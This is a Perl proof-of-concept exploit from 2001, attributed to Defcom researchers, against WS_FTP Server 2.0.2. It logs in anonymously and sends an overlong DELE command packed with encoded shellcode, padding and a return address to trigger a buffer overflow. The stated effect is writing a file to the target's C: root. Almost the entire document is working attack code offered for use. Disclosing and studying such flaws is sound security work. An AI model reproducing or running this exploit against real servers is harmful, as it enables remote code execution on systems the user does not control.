#!/usr/local/bin/perl
#########################################################################
#
# WS_FTP Server 2.0.2 DELE proof-of-concept exploit
# By andreas@defcom.com and janne@defcom.com (C)2001
#
#########################################################################
$login="ftp";	#username
$pass="ftp";	#password
#########################################################################
$ARGC=@ARGV;
if ($ARGC !=1) {
	print "WS_FTP server 2.0.2 DELE proof-of-concept exploit\n";
	print "It creates a file named defcom.iyd in the c-root\n";
	print "(C)2001 andreas\@defcom.com\n";
   	print "Usage: $0 <host>\n";
	print "Example: $0 127.0.0.1\n";
	exit;
}
use Socket;

my($remote,$port,$iaddr,$paddr,$proto);
$remote=$ARGV[0];
$port = "21";

$iaddr = inet_aton($remote) or die "Error: $!";
$paddr = sockaddr_in($port, $iaddr) or die "Error: $!";
$proto = getprotobyname('tcp') or die "Error: $!";

socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die "Error: $!";
connect(SOCK, $paddr) or die "Error: $!";

sleep(1);
$msg = "user $login\n"; 
send(SOCK, $msg, 0) or die "Cannot send query: $!";
$msg = "pass $pass\n";
sleep(1);
send(SOCK, $msg, 0) or die "Cannot send query: $!";
$sploit = "\x8b\xd8\x8b\xf8\x83\xc0\x18\x33\xc9\x66\xb9\x42\x81\x66\x81\xf1\x80\x80\x80\x30\x95\x40\xe2\xfa\xde\x1e\x76";
$sploit = $sploit . "\x1e\x7e\x2e\x95\x6f\x95\x95\xc6\xfd\xd5\x95\x95\x95\x2b\x49\x81\xd0\x95\x6a\x83\x96\x56\x1e\x75\x1e\x7d\xa6\x55";
$sploit = $sploit . "\xc5\xfd\x15\x95\x95\x95\xff\x97\xc5\xc5\xfd\x95\x95\x95\x85\x14\x52\x59\x94\x95\x95\xc2\x2b\xb1\x80\xd0\x95";
$sploit = $sploit . "\x6a\x83\xc5\x2b\x6d\x81\xd0\x95\x6a\x83\xa6\x55\xc5\x2b\x85\x83\xd0\x95\x6a\x83";
$msg = "dele " . $sploit . "\xd4" x (460-length($sploit)) .  "\xf6\xaf\xc9\xf1\xf0\xf3\xf6\xfa\xf8\xbb\xfc\xec\xf1\x95";
$msg = $msg . "\xab\xa3\x54\x77" . "\xd4" x 16 . "\x8b\xc4\x83\xe8\x7f\x83\xe8\x7f\x83\xe8\x7f\x83\xe8\x71\xff\xe0\n";
print $msg;
sleep(1);
send(SOCK, $msg, 0) or die "Cannot send query: $!";
exit;